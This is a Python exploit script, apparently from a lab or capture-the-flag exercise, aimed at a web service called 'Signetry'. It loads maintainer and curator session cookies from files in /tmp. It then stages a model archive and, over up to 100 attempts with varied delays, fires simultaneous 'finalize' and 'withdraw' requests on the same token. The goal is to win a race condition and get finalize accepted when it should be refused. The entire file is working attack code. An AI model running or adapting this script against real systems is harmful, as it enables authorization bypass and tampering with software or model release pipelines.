#!/usr/bin/env python3
import sys
import threading
import time
from pathlib import Path

import requests

TARGET = sys.argv[1].rstrip("/")
MODEL = Path("oathbound-model.zip").read_bytes()

def cookie_header(path):
    for line in Path(path).read_text().splitlines():
        if not line or (line.startswith("#") and not line.startswith("#HttpOnly_")):
            continue
        fields = line.split("\t")
        if len(fields) >= 7:
            return f"{fields[5]}={fields[6]}"
    raise RuntimeError(f"no cookie found in {path}")

maintainer = requests.Session()
maintainer.headers["Cookie"] = cookie_header("/tmp/signetry-maint.cookies")

curator = requests.Session()
curator.headers["Cookie"] = cookie_header("/tmp/signetry-conservator.cookies")

# Establish reusable connections before racing.
for name, session in (("maintainer", maintainer), ("curator", curator)):
    response = session.get(f"{TARGET}/api/whoami", timeout=10)
    response.raise_for_status()
    print(f"{name}={response.json()['role']}")

delays = (0.0, 0.0005, 0.001, 0.002, 0.004)

for attempt in range(1, 101):
    staged = maintainer.post(
        f"{TARGET}/stage",
        headers={"Content-Type": "application/zip"},
        data=MODEL,
        timeout=10,
    )
    staged.raise_for_status()
    token = staged.json()["token"]

    result = {}
    gate = threading.Barrier(3)
    delay = delays[(attempt - 1) % len(delays)]

    def finalize():
        gate.wait()
        result["finalize"] = curator.post(
            f"{TARGET}/finalize",
            json={"token": token},
            timeout=15,
        )

    def withdraw():
        gate.wait()
        time.sleep(delay)
        result["withdraw"] = maintainer.post(
            f"{TARGET}/withdraw",
            json={"token": token},
            timeout=10,
        )

    threads = [
        threading.Thread(target=finalize),
        threading.Thread(target=withdraw),
    ]
    for thread in threads:
        thread.start()

    gate.wait()

    for thread in threads:
        thread.join()

    final = result["finalize"]
    removed = result["withdraw"]

    if attempt % 10 == 0 or final.status_code not in (403, 404):
        print(
            f"attempt={attempt:03d} delay={delay:.4f} "
            f"finalize={final.status_code} withdraw={removed.status_code}"
        )

    if final.status_code not in (403, 404):
        print(f"candidate_hit={final.status_code}")
        print(f"response={final.text}")
        break
else:
    print("candidate_hit=none")
